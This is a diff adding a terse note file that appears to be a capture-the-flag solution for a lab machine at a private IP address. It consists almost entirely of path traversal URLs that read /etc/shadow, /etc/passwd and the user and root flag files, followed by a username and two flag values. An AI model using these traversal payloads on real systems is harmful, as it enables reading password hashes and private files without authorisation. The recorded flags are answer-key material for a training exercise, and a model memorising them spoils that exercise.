@@ -1,0 +1,8 @@
+http://10.10.188.103/article?name=../../../../etc/shadow
+username: falconfeast
+http://10.10.188.103/article?name=../../../../etc/passwd
+http://10.10.188.103/article?name=../../../../home/falconfeast/user.txt
+flag: 60989655118397345799
+
+http://10.10.188.103/article?name=../../../../root/root.txt
+flag: 42964104845495153909
